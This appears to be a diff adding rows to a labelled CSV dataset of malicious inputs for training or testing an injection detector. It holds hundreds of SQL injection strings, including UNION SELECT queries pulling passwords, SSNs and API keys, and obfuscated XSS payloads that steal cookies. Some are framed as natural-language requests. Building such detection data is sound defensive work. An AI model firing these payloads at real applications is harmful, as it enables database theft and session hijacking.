+admin' oR 'z'='x-- -,1,sqli,quote_breakout,claude
+7 Or 5=2%00,1,sqli,bare_logic,claude
+dump auth where token is anything or condition always holds,1,sqli,nl_framed,claude
+'-alert`1`-',1,xss,xss_obf,claude
+1 or exists(select email from clients)#,1,sqli,nl_framed,claude
+<img%09src=x	onerror=alert`1`>,1,xss,xss_obf,claude
+root' oR 'y'='z,1,sqli,quote_breakout,claude
+Or exists(select email from sessions);,1,sqli,nl_framed,claude
+<audioonerror=alert`1`>,1,xss,xss_obf,claude
+"""><isindex oncontentvisibilityautostatechange=print()>",1,xss,xss_obf,claude
+<table onscrollend=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+<isindex onfocus=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+x' OR 'x'='a/**/,1,sqli,quote_breakout,claude
+1 or exists(select ssn from members);,1,sqli,nl_framed,claude
+get every users where 5 = 6 or true,1,sqli,nl_framed,claude
+3 oR password lIkE '%'%00,1,sqli,quote_breakout,claude
+8 oR tRUE,1,sqli,bare_logic,claude
+<svg/oncontentvisibilityautostatechange=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+can you show the field <math oncontentvisibilityautostatechange=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
+please render <textarea onscrollend=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
+get the hash of any clients regardless of id,1,sqli,nl_framed,claude
+6 AND (select count(*) from profiles)>2-- x,1,sqli,nl_framed,claude
+or exists(select uid from accounts)#,1,sqli,nl_framed,claude
+4 OR tRuE,1,sqli,bare_logic,claude
+<img src=x onerror=print()>,1,xss,xss_obf,claude
+3 oR 1=1#,1,sqli,bare_logic,claude
+<xssonload=print()>,1,xss,xss_obf,claude
+9 oR 5=2/**/,1,sqli,bare_logic,claude
+root' OR 'z'='x/**/,1,sqli,quote_breakout,claude
+pull the ssn of any accounts regardless of id,1,sqli,nl_framed,claude
+1' or 'z'='x%00,1,sqli,quote_breakout,claude
+3	UnIoN/**/sELeCT password FRoM users/**/,1,sqli,nl_framed,claude
+<svg/onscrollend=confirm(1)>,1,xss,xss_obf,claude
+<iFrAmE oNERROR=print()>,1,xss,xss_obf,claude
+fetch any clients where 4 is 1 or true,1,sqli,nl_framed,claude
+"""><body onload=alert(document.cookie)>",1,xss,xss_obf,claude
+4 OR uid LIkE '%'-- ,1,sqli,quote_breakout,claude
+root' or 'x'='x%00,1,sqli,quote_breakout,claude
+"4%20UNioN/**/SElECt token,dob,balance FRom members%00",1,sqli,nl_framed,claude
+retrieve the email of each clients regardless of id,1,sqli,nl_framed,claude
+"""><form onerror=confirm(1)>",1,xss,xss_obf,claude
+please render <object onscrollend=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
+<imgsrc=x%09onerror=confirm(1)>,1,xss,xss_obf,claude
+6 OR trUE,1,sqli,bare_logic,claude
+4 or 4=8/*c*/,1,sqli,bare_logic,claude
+root' Or 'y'='a-- x,1,sqli,quote_breakout,claude
+1 Or 4=4/**/,1,sqli,bare_logic,claude
+"""><svg onafterscriptexecute=confirm(1)>",1,xss,xss_obf,claude
+<imgsrc=x	onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+admin' oR '1'='1,1,sqli,quote_breakout,claude
+0x41 OR 0x29=0x65,1,sqli,encoding,claude
+can you show the field <table ontoggle=alert(1)> when it errors,1,xss,xss_obf,claude
+1 or exists(select balance from orders)-- ,1,sqli,nl_framed,claude
+<IMG oNeRROr=alert(1)>,1,xss,xss_obf,claude
+<svg/onload=alert(document.domain)>,1,xss,xss_obf,claude
+<svg/ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+"""><form oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+<iframe onpageshow=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+<isindex	onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+<input onbeforetoggle=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+<SvG OnERroR=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+2 OR dob like '%'-- -,1,sqli,quote_breakout,claude
+fetch tokens where uid is anything or condition always holds,1,sqli,nl_framed,claude
+0x29 OR 0x18=0x73,1,sqli,encoding,claude
+<img%20src=x onerror=print()>,1,xss,xss_obf,claude
+admin' OR '1'='1,1,sqli,quote_breakout,claude
+9 and (select count(*) from accounts)>2,1,sqli,nl_framed,claude
+2 ANd (select count(*) from clients)>3-- x,1,sqli,nl_framed,claude
+get the dob of each auth regardless of id,1,sqli,nl_framed,claude
+can you show the field <isindex ontoggle=print()> when it errors,1,xss,xss_obf,claude
+can you show the field <frameset onstart=alert(document.domain)> when it errors,1,xss,xss_obf,claude
+can you show the field <math onstart=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
+8 and (select count(*) from profiles)>0-- -,1,sqli,nl_framed,claude
+1 or exists(select token from sessions)%00,1,sqli,nl_framed,claude
+can you show the field <xss onbeforetoggle=alert(1)> when it errors,1,xss,xss_obf,claude
+<BoDy ONERRoR=alert(1)>,1,xss,xss_obf,claude
+1 oR 4=5/**/,1,sqli,bare_logic,claude
+"""><input ontoggle=confirm(1)>",1,xss,xss_obf,claude
+2 uNIon%20SELEcT hash FRom auth;,1,sqli,nl_framed,claude
+char(55) or char(57)=char(48),1,sqli,encoding,claude
+x' oR 'b'='a/**/,1,sqli,quote_breakout,claude
+show me profiles where uid is anything or condition always holds,1,sqli,nl_framed,claude
+<iFrAmE ONeRrOR=alert(1)>,1,xss,xss_obf,claude
+<iframe onpageshow=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+4	UNiON%20sEleCT pwd fROM sessions;,1,sqli,nl_framed,claude
+show me staff where dob is anything or condition always holds,1,sqli,nl_framed,claude
+2 OR true,1,sqli,bare_logic,claude
+<img	src=x%09onerror=alert`1`>,1,xss,xss_obf,claude
+"""><object onscrollend=alert(document.domain)>",1,xss,xss_obf,claude
+});top['al'+'ert'](1);//,1,xss,xss_obf,claude
+5 anD (select count(*) from admins)>0,1,sqli,nl_framed,claude
+dump the pwd of every accounts regardless of id,1,sqli,nl_framed,claude
+"""><iframe onstart=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+<svg/ontoggle=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+char(57) or char(51)=char(57),1,sqli,encoding,claude
+dump cards where balance is anything or condition always holds,1,sqli,nl_framed,claude
+give each cards where 2 is 6 or true,1,sqli,nl_framed,claude
+can you show the field <iframe onerror=print()> when it errors,1,xss,xss_obf,claude
+retrieve people where email is anything or condition always holds,1,sqli,nl_framed,claude
+<BoDy oneRrOr=alert(document.cookie)>,1,xss,xss_obf,claude
+char(51) or char(55)=char(49),1,sqli,encoding,claude
+"<img
+src=x onerror=alert(document.cookie)>",1,xss,xss_obf,claude
+pull the balance of any auth regardless of id,1,sqli,nl_framed,claude
+3 Or uid liKe '%'/**/,1,sqli,quote_breakout,claude
+dump the role of every staff regardless of id,1,sqli,nl_framed,claude
+3 or TRuE,1,sqli,bare_logic,claude
+7 or 5=2,1,sqli,bare_logic,claude
+<table onpointerrawupdate=top['al'+'ert']`1`>,1,xss,xss_obf,claude
+<details	onafterscriptexecute=alert(document.cookie)>,1,xss,xss_obf,claude
+<a href=&#106;avascript:alert`1`>x</a>,1,xss,xss_obf,claude
+select the secret of all logs regardless of id,1,sqli,nl_framed,claude
+<svg/onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+"<img
+src=x%20onerror=alert(1)>",1,xss,xss_obf,claude
+char(55) or char(53)=char(49),1,sqli,encoding,claude
+char(51) or char(49)=char(48),1,sqli,encoding,claude
+1 Or 1=8/*c*/,1,sqli,bare_logic,claude
+return each auth where 8 = 1 or true,1,sqli,nl_framed,claude
+get every admins where 9 is 9 or true,1,sqli,nl_framed,claude
+"""><frameset onload=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
+Or exists(select balance from cards),1,sqli,nl_framed,claude
+<video ontoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+<BoDy oNERrOr=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
+please render <frameset onpointerrawupdate=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
+get the dob of all orders regardless of id,1,sqli,nl_framed,claude
+can you show the field <xss oncontentvisibilityautostatechange=alert(document.domain)> when it errors,1,xss,xss_obf,claude
+4 Or token LIKE '%'/*c*/,1,sqli,quote_breakout,claude
+<keygen ontoggle=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+<BoDy OnERroR=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
+1 Or exists(select email from logs)/*c*/,1,sqli,nl_framed,claude
+<BoDy oNeRrOr=alert(1)>,1,xss,xss_obf,claude
+char(48) or char(56)=char(48),1,sqli,encoding,claude
+5 ANd (select count(*) from admins)>3;,1,sqli,nl_framed,claude
+<iFrAmE ONERRoR=alert(document.cookie)>,1,xss,xss_obf,claude
+pull any staff where 9 equals 3 or true,1,sqli,nl_framed,claude
+8 AND (select count(*) from profiles)>0#,1,sqli,nl_framed,claude
+or exists(select ssn from logs)#,1,sqli,nl_framed,claude
+"""><iframe onafterscriptexecute=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
+1 and (select count(*) from tokens)>0#,1,sqli,nl_framed,claude
+7 anD (select count(*) from accounts)>1;,1,sqli,nl_framed,claude
+<svg/onbeforetoggle=alert(1)>,1,xss,xss_obf,claude
+"<img
+src=x%20onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
+0x21 OR 0x69=0x97,1,sqli,encoding,claude
+0x21 oR 0x66=0x71,1,sqli,encoding,claude
+"4 uNioN seleCt balance,role,apikey fROm accounts;",1,sqli,nl_framed,claude
+<video onpointerrawupdate=window['al'+'ert']`1`>,1,xss,xss_obf,claude
+<details onfocus=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+"<video
+ontoggle=print()>",1,xss,xss_obf,claude
+can you show the field <math oncontentvisibilityautostatechange=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
+root' OR 'a'='a/**/,1,sqli,quote_breakout,claude
+<img	src=x/onerror=confirm(1)>,1,xss,xss_obf,claude
+please render <embed onfocus=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
+<a href=&#106;avascript:eval(atob('YWxlcnQoMSk'))>x</a>,1,xss,xss_obf,claude
+list all members where 8 is 8 or true,1,sqli,nl_framed,claude
+8 or 4=1/*c*/,1,sqli,bare_logic,claude
+<a href=&#106;avascript:alert(document.cookie)>x</a>,1,xss,xss_obf,claude
+"5 uNIon%20sElECt dob,secret,uid FROM sessions-- -",1,sqli,nl_framed,claude
+0x61 oR 0x50=0x31,1,sqli,encoding,claude
+1 OR 3=7/**/,1,sqli,bare_logic,claude
+"7/**/UnIOn/**/sElECt password,pwd FRoM people",1,sqli,nl_framed,claude
+please render <input onload=print()> here for the user,1,xss,xss_obf,claude
+"<img
+src=x onerror=alert(1)>",1,xss,xss_obf,claude
+"3	union/**/SElECT email,role,uid FrOm profiles%00",1,sqli,nl_framed,claude
+0x25 or 0x85=0x26,1,sqli,encoding,claude
+5 aNd (select count(*) from auth)>1#,1,sqli,nl_framed,claude
+9 AnD (select count(*) from staff)>1,1,sqli,nl_framed,claude
+OR exists(select balance from logs),1,sqli,nl_framed,claude
+1 or hash lIkE '%'-- ,1,sqli,quote_breakout,claude
+give every people where 7 equals 8 or true,1,sqli,nl_framed,claude
+"8 union/**/SELecT token,dob FrOm logs%00",1,sqli,nl_framed,claude
+2 oR hash liKe '%';,1,sqli,quote_breakout,claude
+<svg/onscrollend=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+<svg onerror=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
+<svg/onafterscriptexecute=alert`1`>,1,xss,xss_obf,claude
+give the apikey of each users regardless of id,1,sqli,nl_framed,claude
+<img%20src=x onerror=alert`1`>,1,xss,xss_obf,claude
+<marquee onscrollend=self['al'+'ert']`1`>,1,xss,xss_obf,claude
+get sessions where uid is anything or condition always holds,1,sqli,nl_framed,claude
+"7%20UNIon%20seLEct apikey,secret FroM auth-- -",1,sqli,nl_framed,claude
+retrieve the apikey of all orders regardless of id,1,sqli,nl_framed,claude
+0x79 oR 0x99=0x89,1,sqli,encoding,claude
+<iframe/ontoggle=alert(1)>,1,xss,xss_obf,claude
+7 Or secret Like '%'-- x,1,sqli,quote_breakout,claude
+"""><body onpointerrawupdate=alert(1)>",1,xss,xss_obf,claude
+0x90 Or 0x25=0x82,1,sqli,encoding,claude
+<svg/onstart=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+give any tokens where 3 is 4 or true,1,sqli,nl_framed,claude
+"""><object onbeforetoggle=confirm(1)>",1,xss,xss_obf,claude
+show me the balance of any sessions regardless of id,1,sqli,nl_framed,claude
+5 Or secret LiKe '%'-- ,1,sqli,quote_breakout,claude
+or exists(select pwd from users)-- -,1,sqli,nl_framed,claude
+please render <xss ontoggle=print()> here for the user,1,xss,xss_obf,claude
+<iFrAmE ONeRror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
+"2 UnIoN%20SeLeCT pwd,role,email FRom staff/*c*/",1,sqli,nl_framed,claude
+5 anD (select count(*) from profiles)>3-- -,1,sqli,nl_framed,claude
+<svg/onafterscriptexecute=alert(1)>,1,xss,xss_obf,claude
+<img/src=x/onerror=alert(1)>,1,xss,xss_obf,claude
+<img	src=x onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
+<iframe onload=&#102;lert(1)>,1,xss,redteam,claude
+char(57) OR char(48)=char(53),1,sqli,redteam,claude
+show me all orders where 2 = 5 or true,1,sqli,redteam,claude
+1 oR exists(select email from staff)#,1,sqli,redteam,claude
+char(54) OR char(51)=char(49),1,sqli,redteam,claude
+5 AnD (select count(*) from staff)>2,1,sqli,redteam,claude
+3 OR pwd Like '%'/*c*/,1,sqli,redteam,claude
+give all accounts where 2 is 1 or true,1,sqli,redteam,claude
+"""><math onpointerrawupdate=print()>",1,xss,redteam,claude
+1 or exists(select apikey from auth),1,sqli,redteam,claude
+"4	UniOn/**/sELECt email,role,secret fRom orders%00",1,sqli,redteam,claude
+"""><style onstart=print()>",1,xss,redteam,claude
+give all sessions where 5 = 1 or true,1,sqli,redteam,claude
+<object onpointerrawupdate=&#117;lert(1)>,1,xss,redteam,claude
+5 oR role LIke '%'%00,1,sqli,redteam,claude
+char(56) oR char(54)=char(48),1,sqli,redteam,claude
+1 OR exists(select password from people),1,sqli,redteam,claude
+7 or pwd liKE '%',1,sqli,redteam,claude
+<SvG ONERrOR=alert`1`>,1,xss,redteam,claude
+"<img/src=x
+onerror=top['al'+'ert'](1)>",1,xss,redteam,claude
+<img src=x onerror=alert(1)>,1,xss,redteam,claude
+8 aND (select count(*) from clients)>0/*c*/,1,sqli,redteam,claude
+8 oR 6=2-- -,1,sqli,redteam,claude
+"<img
+src=xonerror=alert(document.domain)>",1,xss,redteam,claude
+' oR ssn iS noT NulL;,1,sqli,redteam,claude
+"""><form ontoggle=alert(document.cookie)>",1,xss,redteam,claude
+<video/onpointerrawupdate=alert(1)>,1,xss,redteam,claude
+char(56) oR char(52)=char(51),1,sqli,redteam,claude
+9 Or 2=3-- x,1,sqli,redteam,claude
+admin' or 'z'='z/*c*/,1,sqli,redteam,claude
+char(57) or char(52)=char(50),1,sqli,redteam,claude
+1 Or exists(select uid from accounts)/*c*/,1,sqli,redteam,claude
+<IMG onErROr=top['al'+'ert'](1)>,1,xss,redteam,claude
+<SvG OnERrOR=alert(1)>,1,xss,redteam,claude
+4 OR secret likE '%'-- ,1,sqli,redteam,claude
+4 aND (select count(*) from people)>3%00,1,sqli,redteam,claude
+show me every people where 9 equals 3 or true,1,sqli,redteam,claude
+or exists(select role from users)-- -,1,sqli,redteam,claude
+Or exists(select uid from staff)%00,1,sqli,redteam,claude
+9 or 3=1-- ,1,sqli,redteam,claude
+' or token iS NoT nUlL-- x,1,sqli,redteam,claude
+fetch all tokens where 1 = 8 or true,1,sqli,redteam,claude
+' oR hash iS not nULL#,1,sqli,redteam,claude
+1 or 7=8#,1,sqli,redteam,claude
+user' Or 'y'='y-- x,1,sqli,redteam,claude
+char(54) OR char(55)=char(53),1,sqli,redteam,claude
+"1	unIOn%20SelEcT role,pwd froM accounts;",1,sqli,redteam,claude
+4 oR 9=5,1,sqli,redteam,claude
+' or ssn Is NoT nulL;,1,sqli,redteam,claude
+<embed/onpageshow=top['al'+'ert'](1)>,1,xss,redteam,claude
+5 or 1=5/*c*/,1,sqli,redteam,claude
+1' OR 'a'='y-- ,1,sqli,redteam,claude
+<marquee onfocus=top['al'+'ert']`1`>,1,xss,redteam,claude
+x' or 'x'='a,1,sqli,redteam,claude
+<object onerror=&#110;lert(1)>,1,xss,redteam,claude
+9 or hash LIke '%'/*c*/,1,sqli,redteam,claude
+' Or uid iS NOt nUll#,1,sqli,redteam,claude
+1 OR exists(select secret from tokens)-- x,1,sqli,redteam,claude
+2 AnD (select count(*) from accounts)>1%00,1,sqli,redteam,claude
+' OR apikey iS Not nULl;,1,sqli,redteam,claude
+7 OR pwd LikE '%'/*c*/,1,sqli,redteam,claude
+6 and (select count(*) from orders)>0-- ,1,sqli,redteam,claude
+<svg onpointerrawupdate=self['al'+'ert']`1`>,1,xss,redteam,claude
+2 And (select count(*) from orders)>2,1,sqli,redteam,claude
+<svg/onstart=alert(document.cookie)>,1,xss,redteam,claude
+show me all tokens where 5 equals 8 or true,1,sqli,redteam,claude
+8 or 4=8/*c*/,1,sqli,redteam,claude
+4 OR 2=6-- -,1,sqli,redteam,claude
+1 OR exists(select role from sessions)%00,1,sqli,redteam,claude
+show me all auth where 6 is 6 or true,1,sqli,redteam,claude
+8%20uNion/**/sElecT ssn fROm people-- -,1,sqli,redteam,claude
+x' oR 'b'='a-- x,1,sqli,redteam,claude
+<iframe onanimationstart=&#113;lert(1)>,1,xss,redteam,claude
+<SvG ONErRor=print()>,1,xss,redteam,claude
+1 and (select count(*) from accounts)>1,1,sqli,redteam,claude
+9 or secret lIke '%'-- ,1,sqli,redteam,claude
+please render <audio onload=top['al'+'ert'](1)> here,1,xss,redteam,claude
+"""><details onstart=alert(document.cookie)>",1,xss,redteam,claude
+4 And (select count(*) from people)>1%00,1,sqli,redteam,claude
+3 aND (select count(*) from users)>3,1,sqli,redteam,claude
+"""><svg onstart=alert`1`>",1,xss,redteam,claude
+"<svg
+onanimationstart=top['al'+'ert'](1)>",1,xss,redteam,claude
+<math onstart=&#110;lert(1)>,1,xss,redteam,claude
+show me all sessions where 3 = 8 or true,1,sqli,redteam,claude
+Or exists(select password from orders),1,sqli,redteam,claude
+<iframe onpageshow=alert(1)>,1,xss,redteam,claude
+char(54) OR char(57)=char(49),1,sqli,redteam,claude
+list all accounts where 4 equals 6 or true,1,sqli,redteam,claude
+<xss%20onpageshow=alert(document.cookie)>,1,xss,redteam,claude
+fetch all clients where 6 equals 5 or true,1,sqli,redteam,claude
+' or email is NOT null-- x,1,sqli,redteam,claude
+' OR secret IS Not NUlL;,1,sqli,redteam,claude
+9/**/UNiOn%20SELeCT ssn fROM members#,1,sqli,redteam,claude
+"""><form onfocus=alert(1)>",1,xss,redteam,claude
+' Or hash IS Not NuLL,1,sqli,redteam,claude
+5 ANd (select count(*) from auth)>2,1,sqli,redteam,claude
+"<details
+onfocus=top['al'+'ert'](1)>",1,xss,redteam,claude
+char(48) oR char(57)=char(48),1,sqli,redteam,claude
+4 Or password LIKe '%'-- -,1,sqli,redteam,claude
+"""><body onpageshow=alert(document.cookie)>",1,xss,redteam,claude
+' OR hash is nOT nUll-- -,1,sqli,redteam,claude
+8 OR 8=8#,1,sqli,redteam,claude
+9 or 3=7-- -,1,sqli,redteam,claude
+"5	union/**/selEcT email,token,role FRoM clients-- x",1,sqli,redteam,claude
+<video onafterscriptexecute=&#102;lert(1)>,1,xss,redteam,claude
+<math onfocus=window['al'+'ert']`1`>,1,xss,redteam,claude
+' OR secret is nOt Null#,1,sqli,redteam,claude
+Or exists(select password from sessions)-- -,1,sqli,redteam,claude
+admin' oR 'x'='b%00,1,sqli,redteam,claude
+or exists(select secret from members)-- x,1,sqli,redteam,claude
+OR exists(select token from sessions)/*c*/,1,sqli,redteam,claude
+' or email iS NOt nUlL/*c*/,1,sqli,redteam,claude
+<img	src=x/onerror=alert(1)>,1,xss,redteam,claude
+<img	src=x	onerror=alert(1)>,1,xss,redteam,claude
+<svg/onfocus=print()>,1,xss,redteam,claude
+5 OR email liKe '%'#,1,sqli,redteam,claude
+<svg/onstart=alert`1`>,1,xss,redteam,claude
+<form ontoggle=&#116;lert(1)>,1,xss,redteam,claude
+please render <isindex onload=alert`1`> here,1,xss,redteam,claude
+please render <details onfocus=alert(1)> here,1,xss,redteam,claude
+char(55) or char(52)=char(55),1,sqli,redteam,claude
+<style onerror=window['al'+'ert']`1`>,1,xss,redteam,claude
+<svg/onanimationstart=confirm(1)>,1,xss,redteam,claude
+char(57) Or char(53)=char(48),1,sqli,redteam,claude
+please render <xss onload=alert(document.domain)> here,1,xss,redteam,claude
+' oR ssn is NoT NulL-- ,1,sqli,redteam,claude
+<img	src=x/onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
+"""><video ontoggle=alert(document.domain)>",1,xss,redteam,claude
+<IMG OnerrOr=alert(1)>,1,xss,redteam,claude
+"""><object onload=confirm(1)>",1,xss,redteam,claude
+' Or hash IS NOt nULL-- ,1,sqli,redteam,claude
+1 Or exists(select token from auth)#,1,sqli,redteam,claude
+<isindex onload=&#121;lert(1)>,1,xss,redteam,claude
+<iframe onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
+<audio onerror=window['al'+'ert']`1`>,1,xss,redteam,claude
+<math onpageshow=&#98;lert(1)>,1,xss,redteam,claude
+show me all auth where 8 = 7 or true,1,sqli,redteam,claude
+char(56) or char(57)=char(48),1,sqli,redteam,claude
+<xss onpointerrawupdate=&#101;lert(1)>,1,xss,redteam,claude
+please render <details onafterscriptexecute=top['al'+'ert'](1)> here,1,xss,redteam,claude
+5 oR hash LIke '%'-- ,1,sqli,redteam,claude
+1 or exists(select ssn from auth)-- ,1,sqli,redteam,claude
+5 anD (select count(*) from clients)>2#,1,sqli,redteam,claude
+<iframe onafterscriptexecute=top['al'+'ert']`1`>,1,xss,redteam,claude
+<iFrAmE OnErroR=confirm(1)>,1,xss,redteam,claude
+admin' or 'x'='b%00,1,sqli,redteam,claude
+' or secret Is NoT nULL-- ,1,sqli,redteam,claude
+<svg/onload=top['al'+'ert'](1)>,1,xss,redteam,claude
+user' or 'x'='x-- -,1,sqli,redteam,claude
+1' OR 'z'='y-- x,1,sqli,redteam,claude
+1 OR exists(select hash from users)-- ,1,sqli,redteam,claude
+"3%20unIoN seLecT pwd,email fRoM orders",1,sqli,redteam,claude
+char(55) OR char(50)=char(56),1,sqli,redteam,claude
+<style onerror=self['al'+'ert']`1`>,1,xss,redteam,claude
+7 Or 9=9#,1,sqli,redteam,claude
+<audioonanimationstart=confirm(1)>,1,xss,redteam,claude
+6/**/Union/**/SELeCt secret from clients-- -,1,sqli,redteam,claude
+user' oR 'z'='x/*c*/,1,sqli,redteam,claude
+show me every accounts where 4 is 4 or true,1,sqli,redteam,claude
+char(53) oR char(57)=char(56),1,sqli,redteam,claude
+2 AND (select count(*) from people)>0/*c*/,1,sqli,redteam,claude
+return all users where 2 is 2 or true,1,sqli,redteam,claude
+6%20UNIOn%20sElEcT uid frOm users%00,1,sqli,redteam,claude
+<iFrAmE ONeRROr=alert(document.domain)>,1,xss,redteam,claude
+3 oR email LIkE '%',1,sqli,redteam,claude
+3 Or 8=7-- -,1,sqli,redteam,claude
+<xss onfocus=&#109;lert(1)>,1,xss,redteam,claude
+4 oR 7=6%00,1,sqli,redteam,claude
+<body	onstart=alert`1`>,1,xss,redteam,claude
+<body%20onpointerrawupdate=alert(1)>,1,xss,redteam,claude
+7 AND (select count(*) from clients)>0,1,sqli,redteam,claude
+1 or exists(select secret from sessions)-- x,1,sqli,redteam,claude
+<IMG OnERrOr=print()>,1,xss,redteam,claude
+<imgsrc=x	onerror=alert(1)>,1,xss,redteam,claude
+char(54) OR char(56)=char(53),1,sqli,redteam,claude
+8 OR 1=6;,1,sqli,redteam,claude
+' oR password IS nOT nuLl,1,sqli,redteam,claude
+0 Or 4=2#,1,sqli,redteam,claude
+give all users where 9 equals 6 or true,1,sqli,redteam,claude
+show me every clients where 8 equals 6 or true,1,sqli,redteam,claude
+4 Or pwd LikE '%'-- -,1,sqli,redteam,claude
+"5%20UNion/**/sELecT ssn,hash,apikey fROM staff",1,sqli,redteam,claude
+<style	onanimationstart=top['al'+'ert'](1)>,1,xss,redteam,claude
+<svg	onfocus=print()>,1,xss,redteam,claude
+1 oR exists(select ssn from users)/*c*/,1,sqli,redteam,claude
+please render <marquee onfocus=alert(1)> here,1,xss,redteam,claude
+3 oR password LIkE '%';,1,sqli,redteam,claude
+give every staff where 8 = 2 or true,1,sqli,redteam,claude
+"<img
+src=x
+onerror=top['al'+'ert'](1)>",1,xss,redteam,claude
+' oR password is not NULL/*c*/,1,sqli,redteam,claude
+fetch all clients where 4 is 6 or true,1,sqli,redteam,claude
+char(49) Or char(52)=char(51),1,sqli,redteam,claude
+"7%20uNion SeLecT secret,hash,email FrOm sessions;",1,sqli,redteam,claude
+5 oR hash lIKE '%',1,sqli,redteam,claude
+<svg onpointerrawupdate=top['al'+'ert']`1`>,1,xss,redteam,claude
+5 oR 4=4-- x,1,sqli,redteam,claude
+<iframe onfocus=self['al'+'ert']`1`>,1,xss,redteam,claude
+7 AND (select count(*) from members)>3-- ,1,sqli,redteam,claude
+1 Or exists(select secret from users);,1,sqli,redteam,claude
+1 oR exists(select hash from auth),1,sqli,redteam,claude
+6 aNd (select count(*) from sessions)>2#,1,sqli,redteam,claude
+1 OR exists(select secret from orders)#,1,sqli,redteam,claude
+<img/src=x	onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
+<IMG OnErROr=alert`1`>,1,xss,redteam,claude
+<audio onerror=&#106;lert(1)>,1,xss,redteam,claude
+char(51) Or char(56)=char(56),1,sqli,redteam,claude
+6 Or 6=6#,1,sqli,redteam,claude
+<imgsrc=x/onerror=print()>,1,xss,redteam,claude
+1' Or 'z'='y-- ,1,sqli,redteam,claude
+please render <video onload=alert(document.domain)> here,1,xss,redteam,claude
+<iFrAmE oNErROr=alert(1)>,1,xss,redteam,claude
+9 Or token liKe '%',1,sqli,redteam,claude
+please render <video onload=alert`1`> here,1,xss,redteam,claude
+<videoonfocus=alert(document.cookie)>,1,xss,redteam,claude
+fetch all people where 2 is 1 or true,1,sqli,redteam,claude
+5 Or 5=6-- ,1,sqli,redteam,claude
+"5	uNiOn%20SELeCt password,email,token FroM people-- x",1,sqli,redteam,claude
+"6%20unioN/**/sEleCT ssn,uid,secret frOM auth-- ",1,sqli,redteam,claude
+char(48) or char(51)=char(54),1,sqli,redteam,claude
+4 OR password likE '%'-- -,1,sqli,redteam,claude
+Or exists(select token from staff)-- ,1,sqli,redteam,claude
+<SvG ONeRRoR=print()>,1,xss,redteam,claude
+please render <video onload=confirm(1)> here,1,xss,redteam,claude
+please render <svg ontoggle=alert(1)> here,1,xss,redteam,claude
+char(52) or char(57)=char(54),1,sqli,redteam,claude
+"1	UNIOn/**/SElECt password,apikey frOM sessions#",1,sqli,redteam,claude
+9 And (select count(*) from auth)>3-- ,1,sqli,redteam,claude
+<body ontoggle=&#115;lert(1)>,1,xss,redteam,claude
+show me every tokens where 1 equals 6 or true,1,sqli,redteam,claude
+8 aNd (select count(*) from people)>0/*c*/,1,sqli,redteam,claude
+char(56) oR char(55)=char(53),1,sqli,redteam,claude
+please render <video ontoggle=alert(1)> here,1,xss,redteam,claude
+4 oR secret lIKE '%';,1,sqli,redteam,claude
+user' OR 'b'='y%00,1,sqli,redteam,claude
+"5	Union%20sELect password,ssn,email From members-- -",1,sqli,redteam,claude
+3 OR 9=6%00,1,sqli,redteam,claude
+1 OR exists(select email from clients);,1,sqli,redteam,claude
+<objectonfocus=alert`1`>,1,xss,redteam,claude
+' oR token iS nOT nUll,1,sqli,redteam,claude
+"<img
+src=x/onerror=confirm(1)>",1,xss,redteam,claude
+"7%20UniOn/**/SElEct pwd,password,role FROM users;",1,sqli,redteam,claude
+0 Or 9=1-- x,1,sqli,redteam,claude
+char(55) OR char(53)=char(54),1,sqli,redteam,claude
+"<video
+onpageshow=confirm(1)>",1,xss,redteam,claude
+1 OR exists(select email from users)-- ,1,sqli,redteam,claude
+<IMG OnERRor=top['al'+'ert'](1)>,1,xss,redteam,claude
+5 or ssn LIKe '%'/*c*/,1,sqli,redteam,claude
+<SvG Onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
+3 aND (select count(*) from clients)>2-- x,1,sqli,redteam,claude
+please render <details onstart=alert(document.cookie)> here,1,xss,redteam,claude
+<svg/onfocus=alert(1)>,1,xss,redteam,claude
+<form onload=window['al'+'ert']`1`>,1,xss,redteam,claude
+OR exists(select hash from people);,1,sqli,redteam,claude
+4 Or 7=9,1,sqli,redteam,claude
+7 anD (select count(*) from auth)>1,1,sqli,redteam,claude
+8 OR 7=9;,1,sqli,redteam,claude
+7 Or 8=1-- ,1,sqli,redteam,claude
+8 or ssn LIKe '%',1,sqli,redteam,claude
+<body onload=window['al'+'ert']`1`>,1,xss,redteam,claude
+<svg/onload=alert(1)>,1,xss,redteam,claude
+oR exists(select apikey from sessions)-- -,1,sqli,redteam,claude
+<video onfocus=&#106;lert(1)>,1,xss,redteam,claude
